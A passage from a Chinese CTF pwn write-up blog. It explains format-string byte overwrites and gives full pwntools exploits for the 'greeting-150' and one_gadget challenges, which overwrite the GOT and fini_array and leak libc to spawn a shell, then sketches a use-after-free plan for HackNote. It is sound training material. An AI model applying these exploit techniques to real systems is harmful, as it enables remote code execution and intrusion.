<li>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）&#x3D;0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 &#x3D;  0xD0（208），也就是填入%208c%offset$hhn即可</li>
</ol>
<p>单字节覆盖常用脚本(ctf-wiki):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">prev, word, index</span>): <span class="hljs-comment"># prev: payload 长度,  word: 单个字符, index: 偏移地址 + i</span><br>    <span class="hljs-keyword">if</span> prev &lt; word: <span class="hljs-comment">#若payload长度小于单个字符的值时</span><br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span> <span class="hljs-comment">#直接写入差值,补齐</span><br>    <span class="hljs-keyword">elif</span> prev == word: <span class="hljs-comment">#若payload长度等于单个字符的值时</span><br>        result = <span class="hljs-number">0</span> <span class="hljs-comment">#不写</span><br>    <span class="hljs-keyword">else</span>:       <span class="hljs-comment">#若payload长度大于单个字符的值时</span><br>        result = <span class="hljs-number">256</span> + word - prev  <span class="hljs-comment">#通过单个字符溢出来打</span><br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span> <span class="hljs-comment">#添加自payload</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i) <span class="hljs-comment">#32位将要覆盖的地址</span><br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i) <span class="hljs-comment">#64位将要覆盖的地址</span><br>    prev = <span class="hljs-built_in">len</span>(payload) <span class="hljs-comment">#获取payload长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-comment">#传入,payload长度, 目标字节, 偏移</span><br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-comment">#fmt_str(12, 4, exe.got[&#x27;strlen&#x27;], exe.plt[&#x27;system&#x27;])</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">其中每个参数的含义基本如下</span><br><span class="hljs-string">    offset表示要覆盖的地址最初的偏移</span><br><span class="hljs-string">    size表示机器字长</span><br><span class="hljs-string">    addr表示将要覆盖的地址。</span><br><span class="hljs-string">    target表示我们要覆盖为的目的变量值。</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>



<p>通过上面的介绍, 根据以上脚本写字符串漏洞原理写exp</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile  = <span class="hljs-string">&quot;greeting-150&quot;</span><br>libFile  = <span class="hljs-string">&quot;&quot;</span><br><br>remoteIp = <span class="hljs-string">&quot;111.198.29.45&quot;</span><br>remotePort = <span class="hljs-number">46553</span><br><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">0</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	ru(<span class="hljs-string">&#x27;... &#x27;</span>)<br><br>	strlen_got = exe.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br>	<span class="hljs-comment"># ELF Termination Funciton Talbe</span><br>	<span class="hljs-comment"># strlen_got 0x08049a54</span><br>	fini_array = <span class="hljs-number">0x08049934</span><br>	start_addr = <span class="hljs-number">0x080484F0</span><br>	system_plt = <span class="hljs-number">0x08048490</span><br><br>	<span class="hljs-comment"># &#x27;Nice to meet you, %s:)&#x27; + str</span><br>	<span class="hljs-comment"># offset 12</span><br>	offset = <span class="hljs-number">12</span><br>	prelen = <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;Nice to meet you, &#x27;</span>)<br><br>	li(<span class="hljs-string">&#x27;strlen_got: &#x27;</span> + <span class="hljs-built_in">hex</span>(strlen_got))<br>	li(<span class="hljs-string">&#x27;fini_array: &#x27;</span> + <span class="hljs-built_in">hex</span>(fini_array))<br><br>	p = <span class="hljs-string">&#x27;AA&#x27;</span> <span class="hljs-comment">#aliament</span><br>	p += p32(strlen_got + <span class="hljs-number">2</span>)<br>	p += p32(fini_array + <span class="hljs-number">2</span>)<br><br>	p += p32(strlen_got)<br>	p += p32(fini_array)<br>	<span class="hljs-comment">#modify highword(strlen_got)</span><br>	p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x0804</span> - <span class="hljs-number">0x12</span> - prelen) + <span class="hljs-string">&#x27;c%&#x27;</span> + <span class="hljs-built_in">str</span>(offset) + <span class="hljs-string">&#x27;$hn&#x27;</span><br>    <span class="hljs-comment">#modify highword(fini_arry_addr)</span><br>	p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;$hn&#x27;</span><br><br>	<span class="hljs-comment">#modify lowword(system_plt)</span><br>	p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8490</span> - <span class="hljs-number">0x804</span>) + <span class="hljs-string">&#x27;c%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;$hn&#x27;</span><br>	<span class="hljs-comment">#modify lowword(fini_plt)</span><br>	p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x84F0</span> - <span class="hljs-number">0x8490</span>) + <span class="hljs-string">&#x27;c%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">3</span>) + <span class="hljs-string">&#x27;$hn&#x27;</span><br><br>	sl(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br><br><br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libFile)<br><br>	exploit()<br>	finish()<br><br><br></code></pre></td></tr></table></figure>



<h1 id="One-Gadget"><a href="#One-Gadget" class="headerlink" title="One Gadget"></a>One Gadget</h1><p>one-gadget 是glibc里调用<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的一段非常有用的gadget。在我们能够控制ip（也就是pc）的时候，用one-gadget来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用<code>system(&quot;sh&quot;)</code>，这个时候one gadget就可以搞定了</p>
<p>使用one_gadget工具进行获取oen_gadget</p>
<p>one_gadget工具安装:</p>
<p>github: <a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install ruby<br>sudo apt install gem<br>sudo gem install one_gadget<br></code></pre></td></tr></table></figure>

<p>通过ida查看伪代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-built_in">void</span> (*v4)(<span class="hljs-type">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br><span class="hljs-built_in">void</span> (*v5)(<span class="hljs-type">void</span>); <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br><span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br><span class="hljs-built_in">init</span>(*(_QWORD *)&amp;argc, argv, envp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Give me your one gadget:&quot;</span>);<br>__isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v4);<br>v5 = v4;<br><span class="hljs-built_in">v4</span>();<br></code></pre></td></tr></table></figure>

<p>思路: 通过init打印出printf在libc中的地址, 然后计算libc基地址, 使用one_gadget打shell</p>
<p>exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>exeFile  = <span class="hljs-string">&quot;one_gadget&quot;</span><br>libFile  = <span class="hljs-string">&quot;./libc-2.29.so&quot;</span><br><br>remoteIp = <span class="hljs-string">&quot;node3.buuoj.cn&quot;</span><br>remotePort = <span class="hljs-number">26163</span><br><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	print_addr = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>	li(<span class="hljs-string">&#x27;print_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(print_addr))<br>	lib_base = print_addr - lib.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>	one_gadget =[<span class="hljs-number">0xe237f</span>,<span class="hljs-number">0xe2383</span>,<span class="hljs-number">0xe2386</span>,<span class="hljs-number">0x106ef8</span>]<br><br>	sh = lib_base + one_gadget[<span class="hljs-number">3</span>]<br><br>	li(<span class="hljs-string">&#x27;lib_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(lib_base))<br>	li(<span class="hljs-string">&#x27;OG addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(sh))<br>	ru(<span class="hljs-string">&#x27;:&#x27;</span>)<br>	p = <span class="hljs-built_in">str</span>(sh)<br>	<span class="hljs-comment">#db()</span><br>	sl(p)<br>	<span class="hljs-comment">#a = 1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			lib = ELF(libFile)<br>		io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-comment">#io = exe.process()</span><br><br>	<span class="hljs-keyword">else</span>:<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			lib = ELF(libFile)<br><br>	exploit()<br>	finish()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	pwn@Ubuntu:~/share$ one_gadget libc-2.29.so</span><br><span class="hljs-string">	0xe237f execve(&quot;/bin/sh&quot;, rcx, [rbp-0x70])</span><br><span class="hljs-string">	constraints:</span><br><span class="hljs-string">	[rcx] == NULL || rcx == NULL</span><br><span class="hljs-string">	[[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">	0xe2383 execve(&quot;/bin/sh&quot;, rcx, rdx)</span><br><span class="hljs-string">	constraints:</span><br><span class="hljs-string">	[rcx] == NULL || rcx == NULL</span><br><span class="hljs-string">	[rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">	0xe2386 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">	constraints:</span><br><span class="hljs-string">    [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">	[rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">	0x106ef8 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">	constraints:</span><br><span class="hljs-string">	[rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>



<h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>4 &#x2F; 10</p>
<h2 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     i386-32-little<br>RELRO:    Partial RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure>

<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>相对比较简单的堆利用题目, 保护机制比较少,涉及知识点也比较少…</p>
<h2 id="vul-1"><a href="#vul-1" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">rm</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(&amp;buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( ptr[v1] )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)ptr[v1] + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">free</span>(ptr[v1]); <span class="hljs-comment">//释放后没有让指针数组清空</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);                            <span class="hljs-comment">// not set null</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br>... ...<br>    <br><br><span class="hljs-comment">//打印函数</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">puts_0</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(&amp;buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( ptr[v1] )<br>     <span class="hljs-comment">//vul 可以在堆中修改实现控制eip</span><br>    (*(<span class="hljs-type">void</span> (__cdecl **)(<span class="hljs-type">void</span> *))ptr[v1])(ptr[v1]); <span class="hljs-comment">//若没释放会调用 addputs函数</span><br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br><br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">addputs</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(a1 + <span class="hljs-number">4</span>));<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>堆的基本利用</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>使用UAF漏洞实现和在堆中调用指针函数漏洞来实现获取libc基址,获取system地址,再次使用UAF修改该指针打印调用system获得shell</p>
